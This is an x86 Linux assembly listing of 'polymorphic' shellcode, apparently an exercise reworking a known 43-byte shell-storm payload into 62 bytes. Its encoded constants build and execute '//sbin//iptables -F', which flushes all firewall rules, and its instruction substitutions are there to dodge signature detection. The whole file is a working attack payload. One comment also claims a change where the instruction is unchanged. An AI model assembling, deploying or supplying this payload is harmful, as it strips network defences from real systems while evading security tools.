; Original Shellcode - 43 bytes: http://shell-storm.org/shellcode/files/shellcode-825.php
; Polymorphic Shellcode - 62 bytes
; Author: buffered4ever
; 15-03-2019

global _start
section .text
_start:
	sub eax,eax ; changed from xor eax, eax
	push eax
	push word 0x462d
	mov esi, esp
	push eax
	push 0x73656c62 ; changed from push 0x73656c62
	mov edi, 0x51636058
	add edi, 0x10111011 ; changed from push 0x61747069
	mov dword[esp-4], edi
	mov dword[esp-8], 0x2f2f6e69 ; changed from push 0x2f6e6962
	mov dword[esp-12], 0x62732f2f ; changed from push 0x732f2f2f
	sub esp, 12 ; adjusting the stack
	mov ebx, esp
	push eax
	push esi
	push ebx
	mov ecx, esp
	mov edx, eax
	mov al, 0xb
	int 0x80
